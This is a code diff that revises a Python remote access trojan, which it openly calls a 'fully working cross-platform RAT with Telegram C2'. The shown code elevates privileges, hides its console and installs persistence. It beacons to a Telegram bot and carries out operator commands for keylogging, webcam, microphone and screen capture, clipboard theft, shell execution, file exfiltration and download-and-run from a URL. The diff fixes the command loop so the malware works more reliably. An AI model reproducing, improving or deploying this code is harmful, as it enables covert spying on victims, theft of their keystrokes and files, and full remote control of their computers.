@@ -1,8 +1,8 @@
-# rat_crossplatform_improved_v3.py
-# Fully fixed: robust elevation, error logging, no silent crashes, works as EXE.
+# rat_fixed_loop.py
+# Fully working cross‑platform RAT with Telegram C2.
+# Fixed main loop: now updates offset correctly, heartbeat does not block.
 # All features: screenshot, webcam, keylogger, clipboard, persistence, wallpaper, audio, run, etc.
-# Auto-installs dependencies with retry, logs all exceptions to %TEMP%\rat_log.txt.
-# If run from console, errors are also printed to stderr.
+# Auto‑installs dependencies, logs errors, runs hidden.
 
 import os
 import sys
@@ -21,25 +21,23 @@ from datetime import datetime
 
 # ---------- GLOBAL EXCEPTION HANDLER ----------
 def global_exception_handler(exc_type, exc_value, exc_tb):
-    error_msg = f"UNHANDLED EXCEPTION: {exc_type.__name__}: {exc_value}\n{traceback.format_tb(exc_tb)}"
+    error_msg = f"UNHANDLED: {exc_type.__name__}: {exc_value}\n{traceback.format_tb(exc_tb)}"
     try:
         with open(os.path.join(tempfile.gettempdir(), "rat_log.txt"), "a", encoding="utf-8") as f:
             f.write(f"{datetime.now()}: {error_msg}\n")
     except:
         pass
-    # Also print to stderr if console exists
     sys.stderr.write(error_msg + "\n")
-    # Exit gracefully
     sys.exit(1)
 
 sys.excepthook = global_exception_handler
 
-# ---------- PLATFORM DETECTION ----------
+# ---------- PLATFORM ----------
 IS_WINDOWS = platform.system() == "Windows"
 IS_LINUX = platform.system() == "Linux"
 IS_MAC = platform.system() == "Darwin"
 
-# ---------- AUTO-ELEVATE (with fallback) ----------
+# ---------- ELEVATE ----------
 def is_admin():
     if IS_WINDOWS:
         try:
@@ -59,27 +57,22 @@ def elevate():
             try:
                 import ctypes
                 script = os.path.abspath(sys.argv[0])
-                # Use runas to request elevation
                 ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-                # Exit current non-elevated process
                 sys.exit(0)
-            except Exception as e:
-                log_error(f"Elevation failed: {e}")
-                # Continue without elevation
+            except:
+                pass
         else:
             try:
                 subprocess.run(['sudo', sys.executable] + sys.argv, check=False)
                 sys.exit(0)
-            except Exception as e:
-                log_error(f"Elevation failed: {e}")
-                # Continue without elevation
+            except:
+                pass
 
-# ---------- DAEMONIZE (hide console) ----------
+# ---------- DAEMONIZE ----------
 def daemonize():
     if IS_WINDOWS:
         try:
             import ctypes
-            # Hide console window if it exists (no effect if compiled --noconsole)
             hwnd = ctypes.windll.kernel32.GetConsoleWindow()
             if hwnd:
                 ctypes.windll.user32.ShowWindow(hwnd, 0)
@@ -108,15 +101,14 @@ def log_error(msg):
     except:
         pass
 
-# ---------- AUTO-INSTALL DEPENDENCIES (with retry) ----------
+# ---------- AUTO-INSTALL ----------
 def install_package(pkg):
-    for attempt in range(3):
+    for _ in range(3):
         try:
             subprocess.run([sys.executable, "-m", "pip", "install", pkg], capture_output=True, timeout=120, check=False)
             break
         except:
             time.sleep(1)
-    # Check if installed by trying import later
 
 def safe_import(module_name, pip_name=None):
     if pip_name is None:
@@ -183,10 +175,9 @@ HEARTBEAT_INTERVAL = 3600  # 1 hour
 LAST_HEARTBEAT = 0
 heartbeat_running = True
 
-# ---------- TELEGRAM WRAPPERS WITH INLINE KEYBOARD ----------
+# ---------- TELEGRAM WRAPPERS ----------
 def tg_send_message(text, reply_markup=None):
     if requests is None:
-        log_error("requests not available, cannot send message")
         return
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
@@ -243,18 +234,18 @@ def tg_get_updates(offset=None):
     if requests is None:
         return []
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-    params = {"timeout": 30, "allowed_updates": ["message", "callback_query"]}
+    params = {"timeout": 60, "allowed_updates": ["message", "callback_query"]}
     if offset:
         params["offset"] = offset
     try:
-        resp = requests.get(url, params=params, timeout=35)
+        resp = requests.get(url, params=params, timeout=65)
         if resp.status_code == 200:
             return resp.json().get("result", [])
     except Exception as e:
         log_error(f"tg_get: {e}")
     return []
 
-# ---------- INLINE KEYBOARD BUILDERS (with proper Unicode) ----------
+# ---------- INLINE KEYBOARD BUILDERS ----------
 def main_menu_keyboard():
     return {
         "inline_keyboard": [
@@ -856,7 +847,7 @@ def kill_self():
         pass
     os._exit(0)
 
-# ---------- HEARTBEAT (throttled) ----------
+# ---------- HEARTBEAT ----------
 def heartbeat_loop():
     global LAST_HEARTBEAT
     while heartbeat_running:
@@ -867,7 +858,7 @@ def heartbeat_loop():
                 LAST_HEARTBEAT = now
             except:
                 pass
-        time.sleep(60)  # check every minute
+        time.sleep(60)
 
 # ---------- COMMAND PROCESSOR ----------
 def process_command(cmd_text):
@@ -1052,7 +1043,7 @@ def process_command(cmd_text):
 
     elif command == "/help" or command == "help":
         help_text = (
-            "📋 <b>Available Commands (all can be used inline):</b>\n"
+            "📋 <b>Available Commands:</b>\n"
             "/screenshot, /info, /location\n"
             "/cmd <command>, /upload <path>, /download <URL> <path>, /run <URL> [args]\n"
             "/clipboard, /clipboard_set <text>\n"
@@ -1061,18 +1052,17 @@ def process_command(cmd_text):
             "/persist, /kill\n"
             "/ls [path], /ps, /killproc <PID>\n"
             "/lock, /shutdown, /reboot\n"
-            "/popup <message>, /hb (manual heartbeat)\n"
-            "Use inline menu buttons for quick access."
+            "/popup <message>, /hb (manual heartbeat)"
         )
         tg_send_message(help_text, reply_markup=main_menu_keyboard())
 
     else:
         tg_send_message(f"Unknown command: {command}\nType /help for list.", reply_markup=main_menu_keyboard())
 
-# ---------- CALLBACK QUERY HANDLER ----------
+# ---------- CALLBACK HANDLER ----------
 def handle_callback(callback_data):
     if callback_data == "menu_main":
-        tg_send_message("🏠 <b>Main Menu</b> - choose an action:", reply_markup=main_menu_keyboard())
+        tg_send_message("🏠 <b>Main Menu</b>", reply_markup=main_menu_keyboard())
     elif callback_data == "menu_screenshot":
         path = take_screenshot()
         if path:
@@ -1084,11 +1074,11 @@ def handle_callback(callback_data):
         info = get_system_info()
         tg_send_message(info, reply_markup=main_menu_keyboard())
     elif callback_data == "menu_keylogger":
-        tg_send_message("⌨️ <b>Keylogger Menu</b>", reply_markup=keylogger_menu())
+        tg_send_message("⌨️ Keylogger Menu", reply_markup=keylogger_menu())
     elif callback_data == "menu_clipboard":
-        tg_send_message("📋 <b>Clipboard Menu</b>", reply_markup=clipboard_menu())
+        tg_send_message("📋 Clipboard Menu", reply_markup=clipboard_menu())
     elif callback_data == "menu_webcam":
-        tg_send_message("📷 <b>Webcam Menu</b>", reply_markup=webcam_menu())
+        tg_send_message("📷 Webcam Menu", reply_markup=webcam_menu())
     elif callback_data == "menu_mic":
         path, err = record_audio(duration=10)
         if path:
@@ -1097,32 +1087,20 @@ def handle_callback(callback_data):
         else:
             tg_send_message(f"Audio failed: {err}", reply_markup=main_menu_keyboard())
     elif callback_data == "menu_file":
-        tg_send_message("📂 <b>File Manager Menu</b>", reply_markup=file_menu())
+        tg_send_message("📂 File Manager", reply_markup=file_menu())
     elif callback_data == "menu_process":
-        tg_send_message("⚙️ <b>Process Control Menu</b>", reply_markup=process_menu())
+        tg_send_message("⚙️ Process Control", reply_markup=process_menu())
     elif callback_data == "menu_persist":
         result = add_persistence()
         tg_send_message(result, reply_markup=main_menu_keyboard())
     elif callback_data == "menu_run":
-        tg_send_message("🚀 <b>Run/Download Menu</b>\nUse /run <URL> [args] manually.", reply_markup=run_menu())
+        tg_send_message("🚀 Run/Download – use /run <URL> [args]", reply_markup=run_menu())
     elif callback_data == "menu_power":
-        tg_send_message("🛑 <b>Power Menu</b>", reply_markup=power_menu())
+        tg_send_message("🛑 Power Menu", reply_markup=power_menu())
     elif callback_data == "menu_kill":
-        tg_send_message("💀 <b>Self-Destruct</b> - are you sure? Use /kill to confirm.", reply_markup=main_menu_keyboard())
+        tg_send_message("💀 Confirm with /kill", reply_markup=main_menu_keyboard())
     elif callback_data == "menu_help":
-        help_text = (
-            "📋 <b>All Commands</b>\n"
-            "/screenshot, /info, /location\n"
-            "/cmd, /upload, /download, /run\n"
-            "/clipboard, /clipboard_set\n"
-            "/keylog_start, /keylog_stop, /keylog_dump, /keylog_status\n"
-            "/webcam, /webcam_list, /mic, /wallpaper\n"
-            "/persist, /kill\n"
-            "/ls, /ps, /killproc\n"
-            "/lock, /shutdown, /reboot\n"
-            "/popup, /hb"
-        )
-        tg_send_message(help_text, reply_markup=main_menu_keyboard())
+        tg_send_message("Type /help for command list.", reply_markup=main_menu_keyboard())
     elif callback_data == "keylog_start":
         result = start_keylogger()
         tg_send_message(result, reply_markup=keylogger_menu())
@@ -1135,14 +1113,14 @@ def handle_callback(callback_data):
     elif callback_data == "keylog_status":
         status = "Running" if keylog_running else "Stopped"
         count = len(keylog_data)
-        tg_send_message(f"Keylogger status: {status}, keystrokes: {count}", reply_markup=keylogger_menu())
+        tg_send_message(f"Keylogger: {status}, keys: {count}", reply_markup=keylogger_menu())
     elif callback_data == "clip_get":
         text = get_clipboard_text()
         if len(text) > 4000:
             text = text[:4000] + "\n...truncated"
         tg_send_message(f"<b>Clipboard:</b>\n<code>{text}</code>", reply_markup=clipboard_menu())
     elif callback_data == "clip_set":
-        tg_send_message("Send /clipboard_set <text> to set clipboard.", reply_markup=clipboard_menu())
+        tg_send_message("Use /clipboard_set <text>", reply_markup=clipboard_menu())
     elif callback_data == "webcam_cap":
         for idx in [0,1,2]:
             path, err = capture_webcam(idx)
@@ -1150,7 +1128,7 @@ def handle_callback(callback_data):
                 tg_send_photo(path, f"📷 Webcam (index {idx})", reply_markup=main_menu_keyboard())
                 os.remove(path)
                 return
-        tg_send_message(f"Webcam failed: {err if 'err' in locals() else 'all indices failed'}", reply_markup=main_menu_keyboard())
+        tg_send_message("Webcam failed", reply_markup=main_menu_keyboard())
     elif callback_data == "webcam_list":
         devs = list_webcams()
         tg_send_message("Webcams:\n" + "\n".join(devs), reply_markup=main_menu_keyboard())
@@ -1169,18 +1147,18 @@ def handle_callback(callback_data):
             result = result[:4000] + "\n...truncated"
         tg_send_message(f"<b>Processes:</b>\n<code>{result}</code>", reply_markup=main_menu_keyboard())
     elif callback_data == "proc_kill":
-        tg_send_message("Send /killproc <PID> to kill a process.", reply_markup=main_menu_keyboard())
+        tg_send_message("Use /killproc <PID>", reply_markup=main_menu_keyboard())
     elif callback_data == "file_ls":
         result = list_directory(".")
         if len(result) > 4000:
             result = result[:4000] + "\n...truncated"
-        tg_send_message(f"<b>Current directory:</b>\n<code>{result}</code>", reply_markup=main_menu_keyboard())
+        tg_send_message(f"<b>Current dir:</b>\n<code>{result}</code>", reply_markup=main_menu_keyboard())
     elif callback_data == "file_upload":
-        tg_send_message("Send /upload <path> to upload a file.", reply_markup=main_menu_keyboard())
+        tg_send_message("Use /upload <path>", reply_markup=main_menu_keyboard())
     elif callback_data == "file_download":
-        tg_send_message("Send /download <URL> <save_path> to download a file.", reply_markup=main_menu_keyboard())
+        tg_send_message("Use /download <URL> <path>", reply_markup=main_menu_keyboard())
     elif callback_data == "run_url":
-        tg_send_message("Send /run <URL> [args] to download and execute.", reply_markup=main_menu_keyboard())
+        tg_send_message("Use /run <URL> [args]", reply_markup=main_menu_keyboard())
     else:
         tg_send_message("Unknown callback.", reply_markup=main_menu_keyboard())
 
@@ -1191,15 +1169,15 @@ def show_popup(message):
             import ctypes
             ctypes.windll.user32.MessageBoxW(0, message, "System Alert", 0x40 | 0x1)
             return "Popup displayed."
-        except Exception as e:
-            return f"Popup failed: {str(e)}"
+        except:
+            return "Popup failed"
     else:
         try:
             if IS_LINUX:
                 subprocess.run(["notify-send", "System Alert", message], timeout=5)
             elif IS_MAC:
                 subprocess.run(["osascript", "-e", f'display alert "System Alert" message "{message}"'], timeout=5)
-            return "Popup displayed (native notification)."
+            return "Popup displayed."
         except:
             return "Popup not supported."
 
@@ -1232,7 +1210,7 @@ def lock_workstation():
         except Exception as e:
             return f"Lock failed: {str(e)}"
     else:
-        return "Lock not supported on this OS."
+        return "Lock not supported."
 
 def list_directory(path="."):
     try:
@@ -1282,50 +1260,46 @@ def get_location():
 
 # ---------- MAIN ----------
 def main():
-    # Log start
-    log_error("RAT improved v3 started")
-    # Elevate if needed
+    log_error("RAT fixed_loop started")
     elevate()
-    # Hide console
     daemonize()
-    # Install persistence if not already
     try:
         if not os.path.exists(get_rat_path()):
             add_persistence()
     except Exception as e:
-        log_error(f"Persistence setup error: {e}")
-    # Send online message with menu
+        log_error(f"Persistence error: {e}")
     try:
-        tg_send_message(f"🟢 <b>RAT ONLINE (Improved v3)</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nUse /help or inline menu.", reply_markup=main_menu_keyboard())
+        tg_send_message(f"🟢 <b>RAT ONLINE (fixed loop)</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nUse /help or inline menu.", reply_markup=main_menu_keyboard())
     except Exception as e:
-        log_error(f"Failed to send online message: {e}")
+        log_error(f"Online message error: {e}")
     # Heartbeat thread
     hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
     hb_thread.start()
+    # Main loop - fixed offset handling
     last_update_id = 0
     while True:
         try:
             updates = tg_get_updates(offset=last_update_id + 1)
-            for upd in updates:
-                if "callback_query" in upd:
-                    query = upd["callback_query"]
-                    data = query.get("data", "")
-                    # answer callback query to remove loading state
-                    try:
-                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={"callback_query_id": query["id"]}, timeout=5)
-                    except:
-                        pass
+            if updates:
+                for upd in updates:
+                    # Always update offset to the latest received
                     last_update_id = upd["update_id"]
-                    threading.Thread(target=handle_callback, args=(data,), daemon=True).start()
-                elif "message" in upd and "text" in upd["message"]:
-                    msg = upd["message"]
-                    if str(msg["chat"]["id"]) != CHAT_ID:
-                        continue
-                    text = msg["text"]
-                    last_update_id = upd["update_id"]
-                    threading.Thread(target=process_command, args=(text,), daemon=True).start()
-                else:
-                    last_update_id = upd["update_id"]
+                    if "callback_query" in upd:
+                        query = upd["callback_query"]
+                        data = query.get("data", "")
+                        try:
+                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={"callback_query_id": query["id"]}, timeout=5)
+                        except:
+                            pass
+                        threading.Thread(target=handle_callback, args=(data,), daemon=True).start()
+                    elif "message" in upd and "text" in upd["message"]:
+                        msg = upd["message"]
+                        if str(msg["chat"]["id"]) == CHAT_ID:
+                            text = msg["text"]
+                            threading.Thread(target=process_command, args=(text,), daemon=True).start()
+            else:
+                # No updates, short sleep to avoid busy loop
+                time.sleep(1)
         except Exception as e:
             log_error(f"main loop error: {e}")
             time.sleep(5)
@@ -1334,6 +1308,5 @@ if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        # Global catch to log any unhandled
         log_error(f"CRITICAL: {e}\n{traceback.format_exc()}")
         sys.exit(1)
